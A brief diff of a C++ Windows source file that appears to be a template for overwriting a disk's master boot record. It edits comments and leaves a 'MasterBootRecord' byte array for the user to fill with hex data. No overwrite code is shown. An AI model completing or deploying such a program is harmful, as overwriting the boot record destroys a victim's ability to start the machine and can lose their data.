@@ -1,11 +1,10 @@
-//Free for all ;)
-//Subscribe to my channel for more things of this :D
-
 #include <windows.h>
 
-// Edit 07/02/2020, chaneged the name file to "Soucre", and added the cpp extension.
+// Edit 07/02/2020, chaneged the name file to "Source", and added the cpp extension.
 
-const unsigned char MasterBootRecord[] = {}; //here enter you Hexadecimal code in midle of {};
+// Edit 01/01/2022, fixed shitty grammar from past
+
+const unsigned char MasterBootRecord[] = { /*your hex data goes here*/ };
 
 int CALLBACK WinMain(
     HINSTANCE hInstance, HINSTANCE hPrevInstance,
